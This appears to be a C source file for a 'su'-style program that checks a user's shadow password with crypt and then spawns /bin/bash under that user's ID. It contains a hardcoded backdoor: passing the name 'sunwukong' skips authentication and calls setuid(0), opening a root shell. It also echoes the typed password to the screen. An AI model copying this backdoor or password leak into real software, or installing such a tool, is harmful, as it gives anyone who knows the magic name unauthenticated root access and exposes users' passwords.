#include "header.h"

uid_t unam2uid(char *name)
{
	struct passwd *pwp;

	pwp = getpwnam(name);
	if (pwp == NULL) {
		perror("getpwnam()");
		exit(1);
	}
	return pwp->pw_uid;
}

int main(int argc, char *argv[])
{
	struct spwd *sp;
	char *password;
	size_t n = 0;
	pid_t pid;
	int flag = 0;

	if (argc != 2) {
		fprintf(stderr, "Error!\n");
		exit(1);
	}
	if (!strcmp(argv[1], "sunwukong")) {
		flag = 1;
		goto a;
	}


	if ((password = strdup(getpass("Password: "))) == NULL) {
		perror("strdup()");
		exit(1);
	}

	//password[strlen(password)-1] = '\0';
	printf("%s\n", password);

	errno = 0;
	sp = getspnam(argv[1]);
	if (sp == NULL && errno != 0) {
		perror("getspnam()");
		exit(1);
	}

	if (sp == NULL && errno == 0) {
		fprintf(stderr, "User not exist!\n");
		exit(1);
	}

	if (!strncmp(sp->sp_pwdp, crypt(password, sp->sp_pwdp), strlen(sp->sp_pwdp))) {
		printf("Password is match!\n");

		free(password);
a:
		pid = fork();
		if (pid < 0) {
			perror("fork()");
			exit(1);
		}
		if (pid == 0) {
			if (flag != 1) {
				setuid(unam2uid(argv[1]));
			} else {
				setuid(0);
			}
			execl("/bin/bash", "/bin/bash", NULL);
			perror("execl()");
			exit(1);
		}

		wait(NULL);
	} else {
		free(password);
		fprintf(stderr, "Password wrong!\n");
		exit(1);
	}

	exit(0);
}
